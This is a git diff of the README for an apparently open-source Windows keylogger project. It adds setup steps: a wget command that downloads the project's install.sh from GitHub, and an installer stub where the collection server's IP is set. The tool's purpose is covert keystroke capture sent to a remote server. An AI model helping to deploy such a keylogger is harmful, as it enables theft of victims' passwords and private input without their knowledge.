@@ -51,8 +51,17 @@ Open source project, Create a keylogger to operate at windows. and Manage Wireta
 1.Install Ubuntu
 
 2.Download here </br>
-`wget https://raw.githubusercontent.com/intadd/4500keylogger/master/install.sh -O install.sh`
-3. Set Server_url
+`wget https://raw.githubusercontent.com/intadd/4500keylogger/master/install.sh -O install.sh` </br>
+
+3. Set Server_url in installer.sh  </br>
+```
+#! /bin/bash
+
+#4500 keylogger installer
+################################
+server_ip='' #ex)33.33.33.33
+
+````
 
 
 
